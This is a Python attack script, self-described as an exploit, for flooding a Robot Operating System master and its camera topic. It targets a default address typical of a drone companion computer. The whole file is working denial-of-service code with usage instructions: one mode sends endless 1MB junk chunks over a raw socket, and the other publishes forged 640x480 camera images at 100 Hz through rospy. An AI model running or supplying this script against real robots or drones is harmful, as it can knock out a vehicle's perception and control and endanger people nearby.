#!/usr/bin/env python3
"""
ROS Topic Flooding Exploit Script
Floods ROS camera topics to exhaust companion computer resources
"""

import sys
import time
import socket

def check_ros_available():
    """Check if ROS/rospy is available"""
    try:
        import rospy
        from sensor_msgs.msg import Image
        return True, rospy, Image
    except ImportError:
        return False, None, None

def flood_ros_topic_via_network(host='192.168.13.1', port=11311, topic='/camera/image_raw'):
    """
    Flood ROS topic via network (without rospy)
    
    Args:
        host: ROS master host
        port: ROS master port (default: 11311)
        topic: Topic to flood
    """
    print(f"[*] Flooding ROS topic {topic} on {host}:{port}...")
    print("[!] Note: This is a simplified network-based attack")
    print("[!] For full ROS flooding, install rospy: pip install rospy")
    
    # ROS uses XML-RPC for communication
    # This is a simplified version that sends network traffic
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.connect((host, port))
        
        # Send flood of data
        flood_data = b'X' * 1024 * 1024  # 1MB chunks
        
        count = 0
        print("[*] Sending flood data (Press Ctrl+C to stop)...")
        try:
            while True:
                sock.send(flood_data)
                count += 1
                if count % 100 == 0:
                    print(f"[*] Sent {count}MB of data...")
                time.sleep(0.01)
        except KeyboardInterrupt:
            print(f"\n[*] Stopped after sending {count}MB")
        finally:
            sock.close()
    except Exception as e:
        print(f"[-] Error: {e}")
        print("[!] ROS master may not be accessible or may require different approach")

def flood_ros_topic_with_rospy(host='192.168.13.1', port=11311, topic='/camera/image_raw'):
    """
    Flood ROS topic using rospy library
    
    Args:
        host: ROS master host
        port: ROS master port
        topic: Topic to flood
    """
    rospy_available, rospy, Image = check_ros_available()
    
    if not rospy_available:
        print("[-] rospy not available, falling back to network flooding")
        flood_ros_topic_via_network(host, port, topic)
        return
    
    # Set ROS master URI
    import os
    os.environ['ROS_MASTER_URI'] = f'http://{host}:{port}'
    
    # Initialize ROS node
    rospy.init_node('topic_flooder', anonymous=True)
    
    # Create publisher
    pub = rospy.Publisher(topic, Image, queue_size=10)
    
    # Create fake image message
    msg = Image()
    msg.header.stamp = rospy.Time.now()
    msg.header.frame_id = 'camera_frame'
    msg.height = 480
    msg.width = 640
    msg.encoding = 'rgb8'
    msg.is_bigendian = 0
    msg.step = 1920  # width * 3 bytes per pixel
    msg.data = b'\x00' * (640 * 480 * 3)  # Large image data
    
    print(f"[*] Flooding ROS topic {topic} (Press Ctrl+C to stop)...")
    rate = rospy.Rate(100)  # 100 Hz
    
    count = 0
    try:
        while not rospy.is_shutdown():
            msg.header.stamp = rospy.Time.now()
            msg.data = b'\x00' * (640 * 480 * 3)  # Regenerate data
            pub.publish(msg)
            count += 1
            if count % 1000 == 0:
                print(f"[*] Published {count} messages...")
            rate.sleep()
    except KeyboardInterrupt:
        print(f"\n[*] Stopped after publishing {count} messages")

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 ros_topic_flooding.py <host> [port] [topic]")
        print("\nArguments:")
        print("  host    ROS master host (default: 192.168.13.1)")
        print("  port    ROS master port (default: 11311)")
        print("  topic   Topic to flood (default: /camera/image_raw)")
        print("\nExamples:")
        print("  python3 ros_topic_flooding.py 192.168.13.1")
        print("  python3 ros_topic_flooding.py 192.168.13.1 11311 /camera/image_raw")
        print("\nNote: Install rospy for full functionality: pip install rospy")
        sys.exit(1)
    
    host = sys.argv[1]
    
    # Validate host (basic check)
    if not host or len(host) > 255:
        print(f"[-] Invalid host: {host}")
        sys.exit(1)
    
    # Validate port
    try:
        port = int(sys.argv[2]) if len(sys.argv) > 2 and sys.argv[2].isdigit() else 11311
        if not 1 <= port <= 65535:
            raise ValueError("Port must be between 1 and 65535")
    except (ValueError, TypeError) as e:
        print(f"[-] Invalid port: {e}")
        sys.exit(1)
    
    topic = sys.argv[3] if len(sys.argv) > 3 else '/camera/image_raw'
    
    # Validate topic (basic check)
    if not topic.startswith('/'):
        print(f"[-] Invalid topic: {topic} (must start with /)")
        sys.exit(1)
    
    # Check if rospy is available
    rospy_available, _, _ = check_ros_available()
    
    if rospy_available:
        print("[+] rospy available, using ROS API")
        flood_ros_topic_with_rospy(host, port, topic)
    else:
        print("[!] rospy not available, using network flooding")
        flood_ros_topic_via_network(host, port, topic)

if __name__ == "__main__":
    main()
